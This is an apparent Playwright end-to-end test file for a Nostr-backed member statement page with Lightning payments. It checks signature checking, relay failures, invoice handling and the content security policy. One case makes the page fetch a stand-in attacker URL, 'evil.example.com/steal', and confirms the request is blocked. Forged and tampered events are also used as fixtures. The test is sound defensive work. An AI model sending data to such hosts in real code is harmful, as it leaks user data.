// Run with: node tests/e2e-member.cjs   (needs `npm run build` first; uses Playwright)
// Drives the real built member page against pretend relays and a pretend
// Lightning service, one case per line of the ledger's checklist.
const fs = require('fs')
const path = require('path')
const { chromium } = require('playwright')

async function main() {
  const { generateSecretKey, getPublicKey, finalizeEvent } = await import('nostr-tools/pure')
  const { newMemberSecret, memberKeys, sealStatement } = await import('../src/member-core.js')
  const { SAMPLE_STATEMENT } = await import('../src/sample-statement.js')

  let fails = 0
  const ok = (c, m) => { if (!c) { fails++; console.log('FAIL', m) } else console.log('ok  ', m) }

  // ---- fixtures ----
  const ordersSk = generateSecretKey(), ordersPk = getPublicKey(ordersSk)
  const strangerSk = generateSecretKey()
  const secret = newMemberSecret()
  const { lookupId } = memberKeys(secret)
  const baseStatement = (over = {}) => ({ ...SAMPLE_STATEMENT, ordersPubkey: ordersPk, name: 'Ada', ...over })
  const statementEvent = async (sk, st, createdAt, d = lookupId) =>
    finalizeEvent({ kind: 30078, created_at: createdAt, tags: [['d', d]], content: JSON.stringify(await sealStatement(secret, st)) }, sk)
  const goneEvent = (createdAt) => finalizeEvent({ kind: 30078, created_at: createdAt, tags: [['d', lookupId]], content: JSON.stringify({ v: 1, gone: true }) }, ordersSk)
  const now = Math.floor(Date.now() / 1000)

  // ---- a copy of the built page with a real orders key and a Lightning host ----
  const built = fs.readFileSync(path.join(__dirname, '..', '..', 'public', 'member.html'), 'utf8')
  ok(/connect-src 'self' wss:\/\/relay\.damus\.io wss:\/\/nos\.lol wss:\/\/relay\.primal\.net wss:\/\/relay\.0xchat\.com;/.test(built), 'built page allows exactly the configured relays')
  ok(!/connect-src[^;]*\*/.test(built) && !/connect-src[^;]*https:/.test(built.replace(/https:\/\/[a-z]/g, '')), 'built page does not allow connections to arbitrary hosts')
  let page_html = built.replace("ordersPubkey: ''", `ordersPubkey: '${ordersPk}'`)
    .replace('lightningHosts: []', "lightningHosts: ['ln.example.com']")
    .replace("connect-src 'self'", "connect-src 'self' https://ln.example.com")
  const file = path.join(__dirname, '.test-output', 'member-e2e.html')
  fs.mkdirSync(path.dirname(file), { recursive: true })
  fs.writeFileSync(file, page_html)

  const RELAYS = ['wss://relay.damus.io', 'wss://nos.lol', 'wss://relay.primal.net', 'wss://relay.0xchat.com']
  const browser = await chromium.launch()

  // behaviours: relay url -> 'down' | array of events (sent then EOSE)
  async function open(behaviour, { statementless = false } = {}) {
    const ctx = await browser.newContext({ viewport: { width: 1000, height: 1200 } })
    const page = await ctx.newPage()
    for (const url of RELAYS) {
      await page.routeWebSocket(url + '/', ws => {
        const b = behaviour[url]
        if (b === 'down') { ws.close(); return }
        ws.onMessage(msg => {
          const m = JSON.parse(msg)
          if (m[0] !== 'REQ') return
          for (const ev of b || []) ws.send(JSON.stringify(['EVENT', m[1], ev]))
          ws.send(JSON.stringify(['EOSE', m[1]]))
        })
      })
    }
    await page.goto('file://' + file + '#' + secret)
    return page
  }
  const bodyText = async page => (await page.textContent('body')).replace(/\s+/g, ' ')
  const settle = async (page, sel = '#app:not([hidden]), #problem:not([hidden])') => page.waitForSelector(sel, { timeout: 15000 })

  // 1. A genuine statement opens from the relays
  const good = await statementEvent(ordersSk, baseStatement(), now - 100)
  let p = await open({ [RELAYS[0]]: [good], [RELAYS[1]]: [good] })
  await settle(p)
  ok((await bodyText(p)).includes('Hello, Ada'), "a link from the ledger opens that member's statement from the relays")
  await p.context().close()

  // 2. A newer event from any other key is ignored
  const forged = await statementEvent(strangerSk, baseStatement({ name: 'Mallory' }), now + 500)
  p = await open({ [RELAYS[0]]: [forged], [RELAYS[1]]: [good] })
  await settle(p)
  let t = await bodyText(p)
  ok(t.includes('Hello, Ada') && !t.includes('Mallory'), 'an event signed by any other key is ignored, even when newer')
  await p.context().close()

  // 2b. An event with a broken signature (tampered after signing) is ignored
  const tampered = { ...(await statementEvent(ordersSk, baseStatement({ name: 'Mallory' }), now + 900)), created_at: now + 901 }
  p = await open({ [RELAYS[0]]: [tampered], [RELAYS[1]]: [good] })
  await settle(p)
  t = await bodyText(p)
  ok(t.includes('Hello, Ada') && !t.includes('Mallory'), 'an event whose signature does not check out is ignored')
  await p.context().close()

  // 2c. The newest genuine statement wins over an older one
  const older = await statementEvent(ordersSk, baseStatement({ name: 'Older' }), now - 5000)
  p = await open({ [RELAYS[0]]: [older], [RELAYS[1]]: [good] })
  await settle(p)
  ok((await bodyText(p)).includes('Hello, Ada'), 'the newest genuine statement is used')
  await p.context().close()

  // 3. A "gone" statement shows the not-found message and points to a new link
  p = await open({ [RELAYS[0]]: [good, goneEvent(now - 10)], [RELAYS[1]]: [goneEvent(now - 10)] })
  await settle(p)
  t = await bodyText(p)
  ok(/couldn.t find your page/.test(t) && /new link, please use that one/.test(t), 'a gone statement shows the not-found message with the new-link hint')
  await p.context().close()

  // 4. One relay down: still loads. All down: connection message.
  p = await open({ [RELAYS[0]]: 'down', [RELAYS[1]]: 'down', [RELAYS[2]]: [good], [RELAYS[3]]: 'down' })
  await settle(p)
  ok((await bodyText(p)).includes('Hello, Ada'), 'with relays down the page still loads from the one that answers')
  await p.context().close()
  p = await open(Object.fromEntries(RELAYS.map(r => [r, 'down'])))
  await settle(p)
  ok(/couldn.t reach your page/.test(await bodyText(p)), 'with every relay down it shows the connection message')
  await p.context().close()

  // 5. Relays reachable but nothing published
  p = await open({})
  await settle(p)
  ok(/couldn.t find your page yet/.test(await bodyText(p)), 'nothing published shows the not-found message')
  await p.context().close()

  // 6. Lightning: a fresh invoice for exactly the sats, comment included when allowed
  const lnStatement = baseStatement({ bills: [{ id: 'B-2026-12', label: 'December roast', amount: { amt: 38000, cur: 'SAT' }, status: 'due',
    pay: { lightning: { address: 'you@ln.example.com', sats: 38000, comment: 'B-2026-12' } } }] })
  const lnEvent = await statementEvent(ordersSk, lnStatement, now - 50)
  const invoice = (msatsText) => 'lnbc' + msatsText + '1pvjluezpp5qqqsyqcyq5rqwzqfqqqsyqcyq5rqwzqfqqqsyqcyq5rqwzqfqypqdq5xysxxatsyp3k7enxv4jsxqzpuaztrnwngz'
  async function lnPage({ commentAllowed = 30, invoiceFor = n => invoice(String(Math.round(n / 1000 * 10)) + 'n') } = {}) {
    const calls = { lnurl: 0, callbacks: [] }
    const ctx = await browser.newContext({ viewport: { width: 1000, height: 1400 } })
    const page = await ctx.newPage()
    await page.clock.install()
    for (const url of RELAYS) await page.routeWebSocket(url + '/', ws => ws.onMessage(msg => {
      const m = JSON.parse(msg); if (m[0] !== 'REQ') return
      ws.send(JSON.stringify(['EVENT', m[1], lnEvent])); ws.send(JSON.stringify(['EOSE', m[1]]))
    }))
    await page.route('https://ln.example.com/.well-known/lnurlp/you', r => { calls.lnurl++; r.fulfill({ contentType: 'application/json', headers: { 'access-control-allow-origin': '*' },
      body: JSON.stringify({ tag: 'payRequest', callback: 'https://ln.example.com/cb', minSendable: 1000, maxSendable: 1e10, commentAllowed }) }) })
    await page.route('https://ln.example.com/cb**', r => { const u = new URL(r.request().url()); calls.callbacks.push(Object.fromEntries(u.searchParams))
      r.fulfill({ contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: JSON.stringify({ pr: invoiceFor(Number(u.searchParams.get('amount'))) }) }) })
    await page.goto('file://' + file + '#' + secret)
    await page.waitForSelector('#app:not([hidden])', { timeout: 15000 })
    return { page, calls, ctx }
  }
  let L = await lnPage()
  await L.page.click('.lnpay button')
  await L.page.waitForSelector('.lnpay .code')
  ok(L.calls.callbacks[0].amount === '38000000', 'Lightning asks for exactly sats x 1000 millisats')
  ok(L.calls.callbacks[0].comment === 'B-2026-12', 'the bill number goes in the comment when the service allows it')
  ok(await L.page.isVisible('.lnpay .qr svg') && (await L.page.getAttribute('.lnpay a.btn', 'href')).startsWith('lightning:lnbc380000n1'), 'QR code and Open wallet link are shown for the invoice')
  await L.page.clock.fastForward(10 * 60 * 1000 + 1000)
  ok(await L.page.isVisible('text=That invoice has expired') && !(await L.page.isVisible('.lnpay .code')), 'after 10 minutes the old invoice is taken down')
  await L.page.click('.lnpay button')
  await L.page.waitForSelector('.lnpay .code')
  ok(L.calls.callbacks.length === 2 && L.calls.lnurl === 2, 'tapping again asks for a brand-new invoice')
  await L.ctx.close()

  L = await lnPage({ commentAllowed: 0 })
  await L.page.click('.lnpay button'); await L.page.waitForSelector('.lnpay .code')
  ok(!('comment' in L.calls.callbacks[0]), 'no comment is sent when the service does not allow one')
  await L.ctx.close()

  L = await lnPage({ invoiceFor: () => invoice('1000n') })
  await L.page.click('.lnpay button')
  await L.page.waitForSelector('.lnpay .err')
  t = await bodyText(L.page)
  ok(!(await L.page.isVisible('.lnpay .code')) && /couldn.t get an invoice/.test(t) && /Lightning address/.test(t), 'an invoice for the wrong amount is never shown; the address text is the fallback')
  await L.ctx.close()

  // 7. The page cannot phone home to hosts it wasn't told about
  p = await open({ [RELAYS[0]]: [good] }); await settle(p)
  const blocked = await p.evaluate(() => fetch('https://evil.example.com/steal').then(() => 'reached', () => 'blocked'))
  ok(blocked === 'blocked', 'the page cannot send anything to a host outside its list')
  await p.context().close()

  await browser.close()
  console.log(fails ? fails + ' FAILED' : 'all member page checks pass')
  process.exit(fails ? 1 : 0)
}
main().catch(e => { console.error(e); process.exit(1) })
